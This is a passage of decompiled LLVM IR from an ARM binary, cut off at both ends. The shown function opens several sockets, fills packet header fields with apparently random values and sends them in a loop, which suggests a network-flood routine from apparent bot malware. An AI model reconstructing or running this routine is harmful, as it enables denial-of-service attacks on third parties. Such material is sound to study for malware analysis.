  %v5_c724 = mul i32 %v3_c71c, 24
  %v0_c728 = load i32, i32* %r4.global-to-local, align 4
  %v1_c72c = load i32, i32* @r8, align 4
  %v2_c72c = add i32 %v1_c72c, %v5_c724
  store i32 %v2_c72c, i32* %r1.global-to-local, align 4
  %v1_c730 = and i32 %v0_c728, 65280
  store i32 %v1_c730, i32* %r3.global-to-local, align 4
  %v1_c728 = udiv i32 %v0_c728, 256
  %v3_c734 = and i32 %v1_c728, 65280
  store i32 %v3_c734, i32* %r2.global-to-local, align 4
  %v3_c738 = mul i32 %v0_c728, 16777216
  store i32 %v3_c738, i32* %ip.global-to-local, align 4
  %v1_c73c = add i32 %v2_c72c, 20
  %v2_c73c = inttoptr i32 %v1_c73c to i8*
  %v3_c73c = load i8, i8* %v2_c73c, align 1
  %v4_c73c = zext i8 %v3_c73c to i32
  %v4_c740 = mul nuw nsw i32 %v1_c730, 256
  %v5_c740 = or i32 %v4_c740, %v3_c738
  store i32 %v5_c740, i32* %ip.global-to-local, align 4
  %v2_c748 = call i32 @llvm.bswap.i32(i32 %v0_c728)
  %v7_c74c = lshr i32 %v0_c718, %v4_c73c
  %v8_c74c = add i32 %v7_c74c, %v2_c748
  store i32 %v8_c74c, i32* %r2.global-to-local, align 4
  %v3_c758 = mul i32 %v8_c74c, 16777216
  %v1_c750 = mul i32 %v8_c74c, 256
  %v4_c75c = and i32 %v1_c750, 16711680
  %v5_c75c = or i32 %v4_c75c, %v3_c758
  store i32 %v5_c75c, i32* %r1.global-to-local, align 4
  store i32 %v6_c2a4, i32* %r0.global-to-local, align 4
  %v2_c76c = call i32 @llvm.bswap.i32(i32 %v8_c74c)
  store i32 %v2_c76c, i32* %r3.global-to-local, align 4
  store i1 %v2_c610, i1* %cpsr_z.global-to-local, align 1
  %v1_c774 = load i32, i32* @r5, align 4
  %v2_c774 = add i32 %v1_c774, 16
  %v3_c774 = inttoptr i32 %v2_c774 to i32*
  store i32 %v2_c76c, i32* %v3_c774, align 4
  br i1 %v2_c610, label %dec_label_pc_c77c, label %dec_label_pc_c618

dec_label_pc_c77c:                                ; preds = %dec_label_pc_c714, %dec_label_pc_c60c
  %v0_c77c = call i32 @function_f6c4()
  store i32 %v0_c77c, i32* %r0.global-to-local, align 4
  store i32 %v3_c2f8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c78c, i1* %cpsr_z.global-to-local, align 1
  %v1_c790 = load i32, i32* @r5, align 4
  %v2_c790 = add i32 %v1_c790, 12
  %v3_c790 = inttoptr i32 %v2_c790 to i32*
  store i32 %v0_c77c, i32* %v3_c790, align 4
  br i1 %v3_c78c, label %dec_label_pc_c798, label %dec_label_pc_c77c.dec_label_pc_c62c_crit_edge

dec_label_pc_c77c.dec_label_pc_c62c_crit_edge:    ; preds = %dec_label_pc_c77c
  %v1_c630.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c62c

dec_label_pc_c798:                                ; preds = %dec_label_pc_c77c, %dec_label_pc_c618
  %v0_c798 = call i32 @function_f6c4()
  %v1_c798 = trunc i32 %v0_c798 to i8
  store i32 %v0_c798, i32* %r0.global-to-local, align 4
  %v4_c79c30 = udiv i32 %v0_c798, 256
  %v1_c7a0 = trunc i32 %v4_c79c30 to i8
  %v2_c7a0 = load i32, i32* @r5, align 4
  %v3_c7a0 = add i32 %v2_c7a0, 5
  %v4_c7a0 = inttoptr i32 %v3_c7a0 to i8*
  store i8 %v1_c7a0, i8* %v4_c7a0, align 1
  store i32 %v3_c314, i32* %r3.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r4, align 4
  %v9_c7a8 = icmp eq i32 %v3_c314, %v1_c7a8
  store i1 %v9_c7a8, i1* %cpsr_z.global-to-local, align 1
  %v3_c7ac = load i32, i32* @r5, align 4
  %v4_c7ac = add i32 %v3_c7ac, 4
  %v5_c7ac = inttoptr i32 %v4_c7ac to i8*
  store i8 %v1_c798, i8* %v5_c7ac, align 1
  %v0_c7b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c7b0, label %dec_label_pc_c7b4, label %dec_label_pc_c798.dec_label_pc_c638_crit_edge

dec_label_pc_c798.dec_label_pc_c638_crit_edge:    ; preds = %dec_label_pc_c798
  %v1_c63c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c638

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c798, %dec_label_pc_c62c
  %v0_c7b4 = call i32 @function_f6c4()
  %v1_c7b4 = trunc i32 %v0_c7b4 to i8
  store i32 %v0_c7b4, i32* %r0.global-to-local, align 4
  store i32 %v3_c318, i32* %ip.global-to-local, align 4
  %v4_c7bc = sdiv i32 %v0_c7b4, 256
  store i32 %v4_c7bc, i32* %r3.global-to-local, align 4
  %v1_c7c0 = load i32, i32* @r4, align 4
  %v9_c7c0 = icmp eq i32 %v3_c318, %v1_c7c0
  store i1 %v9_c7c0, i1* %cpsr_z.global-to-local, align 1
  %v3_c7c4 = load i32, i32* @r5, align 4
  %v4_c7c4 = add i32 %v3_c7c4, 20
  %v5_c7c4 = inttoptr i32 %v4_c7c4 to i8*
  store i8 %v1_c7b4, i8* %v5_c7c4, align 1
  %v0_c7c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c7c8 = trunc i32 %v0_c7c8 to i8
  %v2_c7c8 = load i32, i32* @r6, align 4
  %v3_c7c8 = add i32 %v2_c7c8, 1
  %v4_c7c8 = inttoptr i32 %v3_c7c8 to i8*
  store i8 %v1_c7c8, i8* %v4_c7c8, align 1
  %v0_c7cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c7cc, label %dec_label_pc_c7d0, label %dec_label_pc_c7b4.dec_label_pc_c644_crit_edge

dec_label_pc_c7b4.dec_label_pc_c644_crit_edge:    ; preds = %dec_label_pc_c7b4
  %v1_c648.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c644

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c7b4, %dec_label_pc_c638
  %v0_c7d0 = call i32 @function_f6c4()
  %v1_c7d0 = trunc i32 %v0_c7d0 to i8
  %v4_c7d4 = sdiv i32 %v0_c7d0, 256
  store i32 %v4_c7d4, i32* %r3.global-to-local, align 4
  %v3_c7d8 = load i32, i32* @r6, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 2
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i8*
  store i8 %v1_c7d0, i8* %v5_c7d8, align 1
  store i32 %v6_c1e0, i32* %r0.global-to-local, align 4
  %v1_c7e0 = load i32, i32* @r4, align 4
  %v9_c7e0 = icmp eq i32 %v6_c1e0, %v1_c7e0
  store i1 %v9_c7e0, i1* %cpsr_z.global-to-local, align 1
  %v0_c7e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c7e4 = trunc i32 %v0_c7e4 to i8
  %v2_c7e4 = load i32, i32* @r6, align 4
  %v3_c7e4 = add i32 %v2_c7e4, 3
  %v4_c7e4 = inttoptr i32 %v3_c7e4 to i8*
  store i8 %v1_c7e4, i8* %v4_c7e4, align 1
  %v0_c7e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c7e8, label %dec_label_pc_c7ec, label %dec_label_pc_c7d0.dec_label_pc_c650_crit_edge

dec_label_pc_c7d0.dec_label_pc_c650_crit_edge:    ; preds = %dec_label_pc_c7d0
  %v1_c654.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c650

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c7d0, %dec_label_pc_c644
  %v0_c7ec = call i32 @function_f6c4()
  store i32 %v0_c7ec, i32* %r0.global-to-local, align 4
  store i32 %v6_c1f8, i32* %r2.global-to-local, align 4
  %v1_c7f4 = load i32, i32* @r4, align 4
  %v9_c7f4 = icmp eq i32 %v6_c1f8, %v1_c7f4
  store i1 %v9_c7f4, i1* %cpsr_z.global-to-local, align 1
  %v1_c7f8 = load i32, i32* @r6, align 4
  %v2_c7f8 = add i32 %v1_c7f8, 4
  %v3_c7f8 = inttoptr i32 %v2_c7f8 to i32*
  store i32 %v0_c7ec, i32* %v3_c7f8, align 4
  br i1 %v9_c7f4, label %dec_label_pc_c800, label %dec_label_pc_c65c

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7ec, %dec_label_pc_c650
  %v0_c800 = call i32 @function_f6c4()
  store i32 %v0_c800, i32* %r0.global-to-local, align 4
  store i32 %v1_c31c, i32* %r3.global-to-local, align 4
  store i1 %v2_c808, i1* %cpsr_z.global-to-local, align 1
  %v1_c80c = load i32, i32* @r6, align 4
  %v2_c80c = add i32 %v1_c80c, 8
  %v3_c80c = inttoptr i32 %v2_c80c to i32*
  store i32 %v0_c800, i32* %v3_c80c, align 4
  br i1 %v2_c808, label %dec_label_pc_c668, label %dec_label_pc_c814

dec_label_pc_c814:                                ; preds = %dec_label_pc_c65c, %dec_label_pc_c800
  %v0_c814 = call i32 @function_f6c4()
  %v1_c814 = trunc i32 %v0_c814 to i8
  store i32 %v0_c814, i32* %r0.global-to-local, align 4
  %v4_c818 = sdiv i32 %v0_c814, 256
  store i32 %v4_c818, i32* %r3.global-to-local, align 4
  %v1_c81c = trunc i32 %v4_c818 to i8
  %v2_c81c = load i32, i32* @r6, align 4
  %v3_c81c = add i32 %v2_c81c, 19
  %v4_c81c = inttoptr i32 %v3_c81c to i8*
  store i8 %v1_c81c, i8* %v4_c81c, align 1
  %v3_c820 = load i32, i32* @r6, align 4
  %v4_c820 = add i32 %v3_c820, 18
  %v5_c820 = inttoptr i32 %v4_c820 to i8*
  store i8 %v1_c814, i8* %v5_c820, align 1
  br label %dec_label_pc_c668

dec_label_pc_c828:                                ; preds = %dec_label_pc_c2c8
  %v0_c828 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c828, i32* %r0.global-to-local, align 4
  %v1_c82c = call i32 @close(i32 %v0_c828)
  store i32 %v1_c82c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c830

dec_label_pc_c830:                                ; preds = %dec_label_pc_c0f0, %dec_label_pc_c828
  %v29_c834 = phi i32 [ -1, %dec_label_pc_c0f0 ], [ %v1_c82c, %dec_label_pc_c828 ]
  store i32 %v3_c0f0, i32* %r4.global-to-local, align 4
  store i32 %v6_c0f0, i32* %r5.global-to-local, align 4
  store i32 %v9_c0f0, i32* %r6.global-to-local, align 4
  store i32 %v12_c0f0, i32* %r7.global-to-local, align 4
  ret i32 %v29_c834

; uselistorder directives
  uselistorder i32 %v4_c818, { 1, 0 }
  uselistorder i32 %v0_c814, { 0, 2, 1 }
  uselistorder i32 %v0_c7b4, { 0, 2, 1 }
  uselistorder i32 %v0_c798, { 0, 2, 1 }
  uselistorder i32 %v2_c76c, { 1, 0 }
  uselistorder i32 %v8_c74c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_c738, { 1, 0 }
  uselistorder i32 %v0_c728, { 2, 0, 1, 3 }
  uselistorder i1 %v2_c708, { 1, 0 }
  uselistorder i32 %v1_c6fc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_c6f8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_c6a0, { 0, 2, 1 }
  uselistorder i32 %v0_c688, { 1, 0, 2 }
  uselistorder i1 %v2_c610, { 3, 0, 1, 2 }
  uselistorder i1 %v2_c808, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c78c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_c5c4, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c3dc, { 1, 0 }
  uselistorder i32 %v3_c3c4, { 1, 0 }
  uselistorder i32 %v1_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i32 %v1_c3b0, { 1, 0 }
  uselistorder i32 %v1_c38c, { 1, 0 }
  uselistorder i32 %v1_c388, { 1, 0 }
  uselistorder i32 %v3_c37c, { 1, 0 }
  uselistorder i32 %v1_c378, { 1, 0 }
  uselistorder i32 %v1_c354, { 1, 0 }
  uselistorder i32 %v1_c34c, { 1, 0 }
  uselistorder i32 %v1_c31c, { 2, 1, 3, 0 }
  uselistorder i32 %v3_c314, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_c30c, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_c308, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v6_c2a4, { 5, 3, 4, 0, 2, 1 }
  uselistorder i32 %v6_c1f8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_c1e0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_c190, { 1, 2, 0 }
  uselistorder i32 %v7_c14c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v6_c128, { 1, 2, 0 }
  uselistorder i32 %v1_c0f4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder label %dec_label_pc_c830, { 1, 0 }
  uselistorder label %dec_label_pc_c814, { 1, 0 }
  uselistorder label %dec_label_pc_c668, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5dc, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c83c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c83c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_c83c = load i32, i32* @r4, align 4
  %v6_c83c = load i32, i32* @r5, align 4
  %v24_c83c = load i32, i32* @fp, align 4
  %v1_c840 = urem i32 %arg1, 256
  store i32 %v1_c840, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_c858 = urem i32 %arg3, 256
  store i32 %v1_c858, i32* @r4, align 4
  %v2_c85c = call i32* @calloc(i32 %v1_c840, i32 4)
  %v4_c85c = ptrtoint i32* %v2_c85c to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_c85c, i32* @sl, align 4
  %v0_c868 = load i32, i32* @r7, align 4
  %v2_c86c = call i32* @calloc(i32 %v0_c868, i32 4)
  %v3_c86c = ptrtoint i32* %v2_c86c to i32
  store i32 65535, i32* @r5, align 4
  %v0_c878 = load i32, i32* @r6, align 4
  store i32 %v0_c878, i32* %r1.global-to-local, align 4
  store i32 %v3_c86c, i32* @sb, align 4
  %v0_c888 = load i32, i32* @r4, align 4
  %v5_c88c = inttoptr i32 %v0_c878 to i32*
  %v6_c88c = call i32 @function_930c(i32 %v0_c888, i32* %v5_c88c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_c894 = urem i32 %v6_c88c, 65536
  %v0_c898 = load i32, i32* @r6, align 4
  store i32 %v0_c898, i32* %r1.global-to-local, align 4
  %v0_c8a0 = load i32, i32* @r5, align 4
  %v0_c8a4 = load i32, i32* @r4, align 4
  %v5_c8ac = inttoptr i32 %v0_c898 to i32*
  %v6_c8ac = call i32 @function_930c(i32 %v0_c8a4, i32* %v5_c8ac, i32 6, i32 %v0_c8a0, i32 %v3_c894)
  %v0_c8b0 = load i32, i32* @r6, align 4
  store i32 %v0_c8b0, i32* %r1.global-to-local, align 4
  %v3_c8b4 = mul i32 %v6_c8ac, 65536
  store i32 %v3_c8b4, i32* %fp.global-to-local, align 4
  %v0_c8c0 = load i32, i32* @r4, align 4
  %v5_c8c4 = inttoptr i32 %v0_c8b0 to i32*
  %v6_c8c4 = call i32 @function_930c(i32 %v0_c8c0, i32* %v5_c8c4, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  %v0_c8d0 = load i32, i32* @r6, align 4
  store i32 %v0_c8d0, i32* %r1.global-to-local, align 4
  %v0_c8d4 = load i32, i32* @r4, align 4
  %v3_c8dc = urem i32 %v6_c8c4, 65536
  store i32 %v3_c8dc, i32* @r6, align 4
  %v5_c8e0 = inttoptr i32 %v0_c8d0 to i32*
  %v6_c8e0 = call i32 @function_930c(i32 %v0_c8d4, i32* %v5_c8e0, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_c8e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c8e4 = udiv i32 %v0_c8e4, 65536
  store i32 %v3_c8e4, i32* %r4.global-to-local, align 4
  %v1_c8ec = load i32, i32* @r5, align 4
  %v9_c8ec = icmp eq i32 %v3_c8e4, %v1_c8ec
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_c8ec, label %dec_label_pc_c914, label %bb

bb:                                               ; preds = %dec_label_pc_c83c
  %v2_c900 = mul nuw nsw i32 %v3_c8e4, 256
  %v4_c904 = and i32 %v2_c900, 65280
  %v1_c908 = urem i32 %v6_c8e0, 256
  store i32 %v1_c908, i32* @r8, align 4
  %v5_c90c = udiv i32 %v0_c8e4, 16777216
  %v6_c90c = or i32 %v4_c904, %v5_c90c
  br label %dec_label_pc_c920

dec_label_pc_c914:                                ; preds = %dec_label_pc_c83c
  %v1_c9088 = urem i32 %v6_c8e0, 256
  store i32 %v1_c9088, i32* @r8, align 4
  %v0_c914 = call i32 @function_f6c4()
  %v3_c91c = urem i32 %v0_c914, 65536
  br label %dec_label_pc_c920

dec_label_pc_c920:                                ; preds = %bb, %dec_label_pc_c914
  %storemerge18 = phi i32 [ %v6_c90c, %bb ], [ %v3_c91c, %dec_label_pc_c914 ]
  store i32 %storemerge18, i32* %fp.global-to-local, align 4
  %v0_c920 = load i32, i32* @r7, align 4
  %tmp43 = icmp slt i32 %v0_c920, 1
  br i1 %tmp43, label %dec_label_pc_cacc.preheader.thread, label %dec_label_pc_c928

dec_label_pc_cacc.preheader.thread:               ; preds = %dec_label_pc_c920
  br label %dec_label_pc_ca94

dec_label_pc_cacc.preheader:                      ; preds = %dec_label_pc_ca28
  %tmp454850 = icmp slt i32 %v1_c97c, 1
  br i1 %tmp454850, label %dec_label_pc_ca94, label %dec_label_pc_ca98.lr.ph

dec_label_pc_c928:                                ; preds = %dec_label_pc_c920
  store i32 %v3_c894, i32* %r1.global-to-local, align 4
  %v3_c92c = udiv i32 %v6_c88c, 256
  %v5_c938 = trunc i32 %v3_c92c to i8
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_c950 = udiv i32 %v6_c88c, 65536
  %v4_c960 = trunc i32 %v3_c950 to i8
  store i8 %v4_c960, i8* %stack_var_-80, align 1
  %v3_ca74 = icmp eq i32 %v3_c894, 65535
  %v2_c998 = ptrtoint i32* %stack_var_-52 to i32
  %tmp44 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_ca58

dec_label_pc_c968:                                ; preds = %dec_label_pc_ca58
  %v2_c968 = load i8, i8* %stack_var_-80, align 1
  %v3_c968 = sext i8 %v2_c968 to i32
  store i32 %v3_c968, i32* %r1.global-to-local, align 4
  %v2_c96c = load i32, i32* %r5.global-to-local, align 4
  %v3_c96c = add i32 %v2_c96c, 2
  %v4_c96c = inttoptr i32 %v3_c96c to i8*
  store i8 %v5_c938, i8* %v4_c96c, align 1
  %v0_c970 = load i32, i32* %r1.global-to-local, align 4
  %v1_c970 = trunc i32 %v0_c970 to i8
  %v2_c970 = load i32, i32* %r5.global-to-local, align 4
  %v3_c970 = add i32 %v2_c970, 3
  %v4_c970 = inttoptr i32 %v3_c970 to i8*
  store i8 %v1_c970, i8* %v4_c970, align 1
  br label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_ca80, %dec_label_pc_c968
  %v1_c97c = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_c98c = call i32 @socket(i32 2, i32 17, i32 17)
  %v7_c994 = icmp eq i32 %v3_c98c, -1
  store i32 %v2_c998, i32* %r1.global-to-local, align 4
  %v2_c9a4 = load i32, i32* @sb, align 4
  %v3_c9a4 = add i32 %v2_c9a4, %stack_var_-60.0
  %v4_c9a4 = inttoptr i32 %v3_c9a4 to i32*
  store i32 %v3_c98c, i32* %v4_c9a4, align 4
  br i1 %v7_c994, label %dec_label_pc_cad8, label %dec_label_pc_c9ac

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c974
  store i32 2, i32* %stack_var_-52, align 4
  %v5_c9cc = call i32 @bind(i32 %v3_c98c, %sockaddr* %tmp44, i32 16)
  %v0_c9d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_c9d0 = add i32 %v0_c9d0, 20
  %v2_c9d0 = inttoptr i32 %v1_c9d0 to i8*
  %v3_c9d0 = load i8, i8* %v2_c9d0, align 1
  %tmp54 = icmp ugt i8 %v3_c9d0, 31
  br i1 %tmp54, label %dec_label_pc_ca28, label %dec_label_pc_c9dc

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_c9ac
  %v1_c9dc = add i32 %v0_c9d0, 16
  %v2_c9dc = inttoptr i32 %v1_c9dc to i32*
  %v3_c9dc = load i32, i32* %v2_c9dc, align 4
  store i32 %v3_c9dc, i32* %r4.global-to-local, align 4
  %v0_c9e0 = call i32 @function_f6c4()
  %v1_c9e8 = and i32 %v3_c9dc, 65280
  %v3_c9f0 = mul i32 %v3_c9dc, 16777216
  %v4_c9f4 = mul nuw nsw i32 %v1_c9e8, 256
  %v5_c9f4 = or i32 %v4_c9f4, %v3_c9f0
  store i32 %v5_c9f4, i32* %r1.global-to-local, align 4
  %v0_c9fc = load i32, i32* %r5.global-to-local, align 4
  %v1_c9fc = add i32 %v0_c9fc, 20
  %v2_c9fc = inttoptr i32 %v1_c9fc to i8*
  %v3_c9fc = load i8, i8* %v2_c9fc, align 1
  %v4_c9fc = zext i8 %v3_c9fc to i32
  %v2_ca00 = call i32 @llvm.bswap.i32(i32 %v3_c9dc)
  %v7_ca04 = lshr i32 %v0_c9e0, %v4_c9fc
  %v8_ca04 = add i32 %v7_ca04, %v2_ca00
  %v3_ca10 = mul i32 %v8_ca04, 16777216
  %v1_ca14 = and i32 %v8_ca04, 65280
  %v4_ca18 = mul nuw nsw i32 %v1_ca14, 256
  %v5_ca18 = or i32 %v4_ca18, %v3_ca10
  store i32 %v5_ca18, i32* %r1.global-to-local, align 4
  %v2_ca20 = call i32 @llvm.bswap.i32(i32 %v8_ca04)
  %v2_ca24 = add i32 %v0_c9fc, 4
  %v3_ca24 = inttoptr i32 %v2_ca24 to i32*
  store i32 %v2_ca20, i32* %v3_ca24, align 4
  %v0_ca34.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %dec_label_pc_c9ac, %dec_label_pc_c9dc
  %v0_ca34 = phi i32 [ %v0_c9d0, %dec_label_pc_c9ac ], [ %v0_ca34.pre, %dec_label_pc_c9dc ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_ca30 = load i32, i32* @sb, align 4
  %v2_ca30 = add i32 %v1_ca30, %stack_var_-60.0
  %v3_ca30 = inttoptr i32 %v2_ca30 to i32*
  %v4_ca30 = load i32, i32* %v3_ca30, align 4
  %v1_ca34 = inttoptr i32 %v0_ca34 to %sockaddr*
  store i32 %v0_ca34, i32* %r1.global-to-local, align 4
  %v5_ca38 = call i32 @connect(i32 %v4_ca30, %sockaddr* %v1_ca34, i32 16)
  %v1_ca44 = add i32 %stack_var_-60.0, 4
  %v1_ca48 = load i32, i32* @r7, align 4
  %v9_ca48 = icmp eq i32 %v1_c97c, %v1_ca48
  %v0_ca50 = load i32, i32* %r5.global-to-local, align 4
  %v1_ca50 = add i32 %v0_ca50, 24
  store i32 %v1_ca50, i32* %r5.global-to-local, align 4
  br i1 %v9_ca48, label %dec_label_pc_cacc.preheader, label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca28, %dec_label_pc_c928
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_c928 ], [ %v1_ca44, %dec_label_pc_ca28 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_c928 ], [ %v1_c97c, %dec_label_pc_ca28 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_ca64 = call i32* @calloc(i32 65535, i32 1)
  %v3_ca64 = ptrtoint i32* %v2_ca64 to i32
  store i32 %v3_c894, i32* %r1.global-to-local, align 4
  %v2_ca78 = load i32, i32* @sl, align 4
  %v3_ca78 = add i32 %v2_ca78, %stack_var_-60.0
  %v4_ca78 = inttoptr i32 %v3_ca78 to i32*
  store i32 %v3_ca64, i32* %v4_ca78, align 4
  br i1 %v3_ca74, label %dec_label_pc_ca80, label %dec_label_pc_c968

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca58
  %v0_ca80 = call i32 @function_f6c4()
  %v1_ca80 = trunc i32 %v0_ca80 to i8
  %v4_ca84 = sdiv i32 %v0_ca80, 256
  %v1_ca88 = trunc i32 %v4_ca84 to i8
  %v2_ca88 = load i32, i32* %r5.global-to-local, align 4
  %v3_ca88 = add i32 %v2_ca88, 3
  %v4_ca88 = inttoptr i32 %v3_ca88 to i8*
  store i8 %v1_ca88, i8* %v4_ca88, align 1
  %v3_ca8c = load i32, i32* %r5.global-to-local, align 4
  %v4_ca8c = add i32 %v3_ca8c, 2
  %v5_ca8c = inttoptr i32 %v4_ca8c to i8*
  store i8 %v1_ca80, i8* %v5_ca8c, align 1
  br label %dec_label_pc_c974

dec_label_pc_ca94:                                ; preds = %dec_label_pc_cacc.loopexit, %dec_label_pc_cacc.preheader.thread, %dec_label_pc_cacc.preheader, %dec_label_pc_cad0.loopexit, %dec_label_pc_ca94
  br label %dec_label_pc_ca94

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca98.lr.ph, %dec_label_pc_cad0.loopexit
  %v0_ca98 = load i32, i32* @r8, align 4
  %v2_ca98 = icmp eq i32 %v0_ca98, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_ca98, label %dec_label_pc_caa0, label %dec_label_pc_cae0

dec_label_pc_caa0:                                ; preds = %dec_label_pc_ca98
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %dec_label_pc_caa8, %dec_label_pc_caa0
  %v0_cab0 = phi i32 [ %v1_cab0, %dec_label_pc_caa8 ], [ 0, %dec_label_pc_caa0 ]
  %v0_caa8 = phi i32 [ %v1_cac4, %dec_label_pc_caa8 ], [ 0, %dec_label_pc_caa0 ]
  %v1_caa8 = load i32, i32* @sb, align 4
  %v2_caa8 = add i32 %v1_caa8, %v0_caa8
  %v3_caa8 = inttoptr i32 %v2_caa8 to i32*
  %v4_caa8 = load i32, i32* %v3_caa8, align 4
  %v1_caac = load i32, i32* @sl, align 4
  %v2_caac = add i32 %v1_caac, %v0_caa8
  %v3_caac = inttoptr i32 %v2_caac to i32*
  %v4_caac = load i32, i32* %v3_caac, align 4
  store i32 %v4_caac, i32* %r1.global-to-local, align 4
  %v1_cab0 = add i32 %v0_cab0, 1
  store i32 %v1_cab0, i32* %r5.global-to-local, align 4
  %v0_cab4 = load i32, i32* @r6, align 4
  %v4_cabc = inttoptr i32 %v4_caac to i32*
  %v5_cabc = call i32 @send(i32 %v4_caa8, i32* %v4_cabc, i32 %v0_cab4, i32 16384)
  %v1_cac0 = load i32, i32* @r7, align 4
  %v9_cac0 = icmp eq i32 %v1_cab0, %v1_cac0
  %v0_cac4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cac4 = add i32 %v0_cac4, 4
  store i32 %v1_cac4, i32* %r4.global-to-local, align 4
  br i1 %v9_cac0, label %dec_label_pc_cacc.loopexit, label %dec_label_pc_caa8

dec_label_pc_cacc.loopexit:                       ; preds = %dec_label_pc_caa8
  %tmp4548 = icmp slt i32 %v1_cab0, 1
  br i1 %tmp4548, label %dec_label_pc_ca94, label %dec_label_pc_ca98.lr.ph

